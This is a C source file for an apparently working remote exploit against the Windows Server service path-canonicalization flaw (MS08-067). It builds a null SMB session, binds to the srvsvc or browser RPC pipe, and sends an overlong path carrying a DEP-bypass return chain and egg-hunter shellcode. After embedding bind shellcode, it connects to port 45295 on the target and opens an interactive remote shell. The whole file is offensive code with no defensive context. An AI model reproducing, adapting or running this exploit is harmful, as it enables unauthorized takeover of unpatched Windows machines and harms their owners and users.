#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "session.h"

#include "ansi.h"
#include "exploit_ms0867.h"
#include "netio.h"
#include "rpc.h"
#include "smb_funct.h"
#include "x86_win32_shellcode.h"

void
exploit_ms0867_add_evil_path(u_int8_t *data)
{
        char *path_prefix = "\\A\\..\\..\\";

        size_t length = MAGIC_SIZE - strlen(path_prefix) * 2;
        
        int i = 0;

        for (i = 0; i < strlen(path_prefix); i++) {

                *data = path_prefix[i];
                data++;

                *data = '\0';
                data++;
        }

        memset(data, 0xCC, length);

        data += 14;

        ADD_UINT32(data, 0xb0efb0ef); // sfp
        ADD_UINT32(data, 0x7c952080); // break DEP part 1
        ADD_UINT32(data, 0x7C901194); // fix SFP
        ADD_UINT32(data, 0x41414141);
        ADD_UINT32(data, 0x41414141);
        ADD_UINT32(data, 0x7c914393); // ret, call *%esp
        ADD_UINT32(data, 0x7c91d3f8); // break DEP part 2

        memcpy(data, &x86_find_sc, sizeof(x86_find_sc) - 1);

        return; 
}

size_t
exploit_ms0867_build_string(u_int8_t *rpc_data) 
{
        char *prefix    = "";
        char *unc_path  = "n3tr1c!"; 

        u_int8_t *old_rpc_data = rpc_data;

        /* UNC path */

        ADD_UINT32(rpc_data, 0xbade5dee);               // Referent ID
        ADD_UINT32(rpc_data, strlen(unc_path) + 1);     // Max count
        ADD_UINT32(rpc_data, 0);                        // Offset
        ADD_UINT32(rpc_data, strlen(unc_path) + 1);     // Actual count
        ADD_STRING(rpc_data, unc_path);
        ADD_UINT16(rpc_data, 0);                        // Padding

        /* Path */

        ADD_UINT32(rpc_data, MAGIC_SIZE + 1);           // Max count
        ADD_UINT32(rpc_data, 0);                        // Offset
        ADD_UINT32(rpc_data, MAGIC_SIZE + 1);           // Actual count

        exploit_ms0867_add_evil_path(rpc_data);

        rpc_data += (MAGIC_SIZE * 2);

        ADD_UINT32(rpc_data, 0);                        // Padding

        /* Prefix */

        ADD_UINT32(rpc_data, 1);                        // Maxbuf
        ADD_UINT32(rpc_data, strlen(prefix) + 1);       // Max count
        ADD_UINT32(rpc_data, 0);                        // Offset
        ADD_UINT32(rpc_data, strlen(prefix) + 1);       // Actual count
        ADD_STRING(rpc_data, prefix);
        ADD_UINT16(rpc_data, 0);                        // NULL byte
        
        /* Path type */

        ADD_UINT16(rpc_data, 0xb0ef);                   // Pointer path type
        ADD_UINT32(rpc_data, 0x1);                      // Path type
        ADD_UINT32(rpc_data, 0x1);                      // Path flags

        memcpy(rpc_data, &x86_win32_bind, sizeof(x86_win32_bind));
        
        rpc_data += sizeof(x86_win32_bind) + 1024;
        
        return rpc_data - old_rpc_data; 
}

int
exploit_ms0867(struct SMB_session *session)
{
        char send_buf[0xffff];

        struct RPC_session      rpc_session;

        size_t length = 0;

        int fd = 0;

        memset((void *)&rpc_session,    '\0', sizeof(struct RPC_session));
        memset((void *)&send_buf,       '\0', sizeof(send_buf));

        if (SMB_connect(session) < 0) {
                fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_connect: "DR"Unable to connect to %s ...\r\n"NO, session->hostname);
                SMB_free_session(session);
                exit(EXIT_FAILURE);
        }

        fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Establishing NULL session to "LG"\\\\%s\\IPC$ "DG"... \r\n"NO, session->hostname);

        session->username = "n3tr1c";

        if (SMB_establish_null_session(session) < 0) {

                fprintf(stdout, " -  Failed. Trying NULL username ... \r\n");
        
                SMB_free_session(session);

                if (SMB_connect(session) < 0) {
                        fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_connect: "DR"Unable to connect to %s ...\r\n"NO, session->hostname);
                        SMB_free_session(session);
                        exit(EXIT_FAILURE);
                }

                session->username = "";

                if (SMB_establish_null_session(session) < 0) {
                        fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_establish_null_session: "DR"Failed.\r\n"NO);
                        SMB_free_session(session);
                        exit(EXIT_FAILURE);
                }
        }

        if (session->native_lm && session->native_os) 
        fprintf(stdout, " -  Remote version: %s (%s)\r\n", session->native_os, session->native_lm);

        rpc_session.pipe_name           = "\\srvsvc";
        rpc_session.uuid                = "4b324fc8-1670-01d3-1278-5a47bf6ee188";
        rpc_session.uuid_ver_major      = 3;
        rpc_session.uuid_ver_minor      = 0;
        rpc_session.syntax              = "8a885d04-1ceb-11c9-9fe8-08002b104860";

        fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Binding to the interace ... \r\n"NO
                        " -  Trying %s (%s) \r\n", rpc_session.pipe_name, rpc_session.uuid);

        if (SMB_rpc_bind(session, &rpc_session) < 0) {
                
                rpc_session.pipe_name = "\\browser";

                fprintf(stdout, " -  Trying %s (%s) \r\n", rpc_session.pipe_name, rpc_session.uuid);

                if (SMB_rpc_bind(session, &rpc_session) < 0) {
                        fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_rpc_bind: "DR"Failed.\r\n"NO);
                        SMB_free_session(session);
                        exit(EXIT_FAILURE);             
                }
        }

        length = exploit_ms0867_build_string(send_buf);

        fprintf(stdout, " -  Calling NetprPathCanonicalize ... \r\n");

        if (SMB_rpc(session, NetprPathCanonicalize, send_buf, length)) {

                fd = netio_connect(session->hostname, 45295);
        
                if (fd < 0) {
                        fprintf(stderr, GR"["LR"!"GR"]"LR" exploit_ms0867: "DR"Shellcode didn't execute!\r\n"NO);
                        SMB_free_session(session);
                        exit(EXIT_FAILURE);
                }

                fprintf(stdout, "\r\n"GR"["LG"!"GR"]"DG" Entering shell ... "NO"\r\n\r\n");
                netio_handle_shell(fd);
                return 0;
        }

        fprintf(stderr, GR"["LR"!"GR"]"LR" exploit_ms0867: "DR"Not vulnerable?\r\n"NO);

        return -1;
}
